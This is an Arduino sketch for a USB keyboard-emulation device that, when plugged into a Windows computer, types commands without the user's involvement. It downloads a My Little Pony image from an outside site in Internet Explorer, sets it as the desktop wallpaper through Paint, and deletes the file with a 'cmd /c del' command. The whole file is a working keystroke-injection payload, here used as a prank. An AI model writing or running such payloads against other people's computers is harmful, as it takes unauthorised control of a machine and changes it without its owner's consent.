#include <Keyboard.h>

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  delay(2500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(250);
  
  Keyboard.print("iexplore http://cdn32.sptndigital.com/sites/uk.tinypop/files/styles/image_1170x658/public/ct_series_f_primary_image/mylittlepony_show.jpg");

  typeKey(KEY_RETURN);

  delay(2500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  typeKey(KEY_RETURN);

  delay(250);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(250);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(250);

  Keyboard.print("mspaint %USERPROFILE%\\Pictures\\mylittlepony_show.jpg");

  delay(250);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();

  delay(1000);

  typeKey('b');

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(250);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(1350);

  Keyboard.print("cmd /c del %USERPROFILE%\\Pictures\\mylittlepony_show.jpg");

  delay(250);

  typeKey(KEY_RETURN);

  delay(500);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
